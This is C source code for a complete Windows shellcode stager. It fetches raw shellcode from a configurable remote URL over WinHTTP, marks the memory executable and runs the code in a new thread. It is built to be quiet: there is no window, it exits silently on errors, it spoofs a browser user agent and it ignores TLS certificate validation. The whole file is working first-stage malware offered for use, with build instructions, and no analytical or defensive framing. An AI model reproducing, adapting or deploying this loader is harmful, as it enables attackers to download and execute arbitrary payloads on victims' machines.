/*
 * stager.c — Minimal WinHTTP shellcode stager (~8 KB stripped)
 *
 * Fetches raw shellcode from STAGE_URL, allocates RWX memory,
 * copies it in, and executes via CreateThread. Silent on any error.
 *
 * Build (Linux → Windows x64):
 *   x86_64-w64-mingw32-gcc stager.c -o stager.exe \
 *       -mwindows -Os -s -fno-stack-protector -fno-ident \
 *       -DSTAGE_URL=\"https://host:port/stage/token\" \
 *       -lwinhttp -lkernel32
 *
 * No CRT dependencies: uses only kernel32 + winhttp.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>

#ifndef STAGE_URL
#define STAGE_URL "http://127.0.0.1:8080/stage/token"
#endif

#ifndef CONNECT_TIMEOUT_MS
#define CONNECT_TIMEOUT_MS 10000
#endif

/* Simple wide-string helpers (no CRT) */
static int my_strlen(const char *s) {
    int n = 0; while (s[n]) n++; return n;
}

static void ascii_to_wide(const char *src, wchar_t *dst, int max) {
    int i = 0;
    while (i < max - 1 && src[i]) { dst[i] = (wchar_t)(unsigned char)src[i]; i++; }
    dst[i] = 0;
}

/* Parse http[s]://host[:port]/path from a flat ASCII URL */
static int parse_url(const char *url, wchar_t *host, int host_sz,
                     wchar_t *path, int path_sz,
                     INTERNET_PORT *port, BOOL *https) {
    const char *p = url;
    *https = FALSE;
    if (p[0]=='h' && p[1]=='t' && p[2]=='t' && p[3]=='p') {
        p += 4;
        if (p[0]=='s') { *https = TRUE; p++; }
        if (p[0]==':' && p[1]=='/' && p[2]=='/') p += 3;
        else return 0;
    } else return 0;

    /* host[:port] */
    const char *host_start = p;
    while (*p && *p != ':' && *p != '/') p++;
    int host_len = (int)(p - host_start);
    if (host_len <= 0 || host_len >= host_sz) return 0;
    for (int i = 0; i < host_len; i++) host[i] = (wchar_t)(unsigned char)host_start[i];
    host[host_len] = 0;

    *port = *https ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
    if (*p == ':') {
        p++;
        int pn = 0;
        while (*p >= '0' && *p <= '9') { pn = pn * 10 + (*p - '0'); p++; }
        *port = (INTERNET_PORT)pn;
    }

    /* /path */
    if (*p == '/') {
        ascii_to_wide(p, path, path_sz);
    } else {
        path[0] = '/'; path[1] = 0;
    }
    return 1;
}

/* Fetch URL → heap buffer. Returns NULL on failure, sets *sz on success. */
static BYTE *fetch(const char *url, DWORD *sz) {
    wchar_t host[256], path[1024];
    INTERNET_PORT port;
    BOOL https;
    if (!parse_url(url, host, 256, path, 1024, &port, &https)) return NULL;

    HINTERNET hSess = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                  WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) return NULL;

    DWORD timeout = CONNECT_TIMEOUT_MS;
    WinHttpSetOption(hSess, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hSess, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    HINTERNET hConn = WinHttpConnect(hSess, host, port, 0);
    if (!hConn) { WinHttpCloseHandle(hSess); return NULL; }

    DWORD flags = https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", path, NULL,
                                        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return NULL; }

    if (https) {
        DWORD ign = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &ign, sizeof(ign));
    }

    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hReq, NULL)) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
        return NULL;
    }

    /* Stream body into a growing heap buffer */
    BYTE  *buf  = NULL;
    DWORD  total = 0;
    DWORD  avail = 0;
    HANDLE heap  = GetProcessHeap();
    while (WinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
        BYTE  *nb  = (BYTE *)HeapReAlloc(heap, 0, buf, total + avail);
        if (!nb) { HeapFree(heap, 0, buf); buf = NULL; break; }
        buf = nb;
        DWORD read = 0;
        WinHttpReadData(hReq, buf + total, avail, &read);
        total += read;
        avail  = 0;
    }

    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
    *sz = total;
    return buf;
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
    (void)h; (void)p; (void)cmd; (void)show;

    DWORD sz = 0;
    BYTE *sc = fetch(STAGE_URL, &sz);
    if (!sc || sz == 0) ExitProcess(0);

    /* Allocate RW, copy shellcode, flip to RX, execute */
    LPVOID mem = VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { HeapFree(GetProcessHeap(), 0, sc); ExitProcess(0); }

    BYTE *dst = (BYTE *)mem;
    for (DWORD i = 0; i < sz; i++) dst[i] = sc[i];
    HeapFree(GetProcessHeap(), 0, sc);

    DWORD old;
    VirtualProtect(mem, sz, PAGE_EXECUTE_READ, &old);

    HANDLE ht = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (ht) WaitForSingleObject(ht, INFINITE);

    ExitProcess(0);
}
